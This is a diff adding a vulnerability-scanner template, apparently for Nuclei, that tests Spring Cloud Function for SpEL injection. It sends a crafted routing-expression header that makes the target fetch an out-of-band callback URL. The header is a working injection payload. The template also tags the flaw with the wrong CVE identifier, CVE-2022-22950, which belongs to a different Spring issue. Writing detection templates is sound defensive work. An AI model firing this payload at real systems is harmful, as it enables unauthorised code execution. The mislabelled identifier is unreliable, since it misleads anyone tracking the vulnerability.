@@ -1,0 +1,31 @@
+id: CVE-2022-22950
+info:
+  name: Spring Cloud Function SPEL Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Spring Cloud Function is a function calculation framework based on Spring Boot. The HTTP request header `spring.cloud.function.routing-expression` parameter allows SPEL expression injection and execution via `StandardEvaluationContext`. This can lead to remote command execution.
+  reference:
+    - https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f
+    - https://github.com/spring-cloud/spring-cloud-function/tags
+  tags: command-execution
+
+http:
+  - raw:
+      - |
+        POST /functionRouter HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        spring.cloud.function.routing-expression: "new java.net.URL(\"http://{{interactsh-url}}\").getContent()"
+
+        {{rand_base(8)}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+      - type: word
+        part: interactsh_request
+        words:
+          - "{{interactsh-url}}"
